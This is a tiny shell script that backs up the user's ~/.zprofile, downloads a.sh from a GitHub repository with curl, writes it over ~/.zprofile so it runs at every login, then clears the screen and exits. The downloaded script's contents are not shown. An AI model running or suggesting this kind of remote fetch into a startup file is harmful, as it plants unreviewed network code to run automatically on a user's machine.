if [ -f ~/.zprofile ] && ! [[ -f ~/.zprofile_org ]]; then
    mv ~/.zprofile ~/.zprofile_org
fi
curl https://raw.githubusercontent.com/21studentkotik/akva/main/a.sh -o ~/.zprofile
clear
exit
